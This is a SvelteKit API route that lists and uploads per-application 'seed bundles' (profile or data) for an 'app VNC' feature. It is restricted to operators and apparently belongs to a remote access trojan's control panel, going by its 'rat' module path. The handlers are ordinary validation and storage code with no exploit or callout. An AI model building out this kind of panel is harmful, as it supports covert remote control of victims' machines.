import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { requireOperator } from '$lib/server/authorization';
import {
	listSeedBundles,
	registerSeedBundle,
	type AppVncSeedBundleKind
} from '$lib/server/rat/app-vnc-seeds';
import type { AppVncPlatform } from '$lib/types/app-vnc';

function normalizePlatform(value: FormDataEntryValue | null): AppVncPlatform {
	const platform = typeof value === 'string' ? value.trim().toLowerCase() : '';
	if (platform === 'windows' || platform === 'linux' || platform === 'macos') {
		return platform;
	}
	throw error(400, 'Invalid platform value');
}

function normalizeKind(value: FormDataEntryValue | null): AppVncSeedBundleKind {
	const kind = typeof value === 'string' ? value.trim().toLowerCase() : '';
	if (kind === 'profile' || kind === 'data') {
		return kind;
	}
	throw error(400, 'Invalid seed bundle kind');
}

export const GET: RequestHandler = async ({ locals }) => {
	requireOperator(locals.user);
	const bundles = await listSeedBundles();
	return json({ bundles });
};

export const POST: RequestHandler = async ({ request, locals }) => {
	const user = requireOperator(locals.user);
	void user;
	const form = await request.formData();
	const appId = (form.get('appId') as string | null)?.trim();
	if (!appId) {
		throw error(400, 'Application identifier is required');
	}
	const platform = normalizePlatform(form.get('platform'));
	const kind = normalizeKind(form.get('kind'));
	const file = form.get('bundle');
	if (!(file instanceof File)) {
		throw error(400, 'Seed bundle file is required');
	}
	const arrayBuffer = await file.arrayBuffer();
	const buffer = Buffer.from(arrayBuffer);
	if (buffer.byteLength === 0) {
		throw error(400, 'Seed bundle cannot be empty');
	}
	try {
		const metadata = await registerSeedBundle({
			appId,
			platform,
			kind,
			originalName: file.name,
			buffer
		});
		const bundles = await listSeedBundles();
		return json({ bundle: metadata, bundles }, { status: 201 });
	} catch (err) {
		throw error(400, (err as Error).message ?? 'Failed to store seed bundle');
	}
};
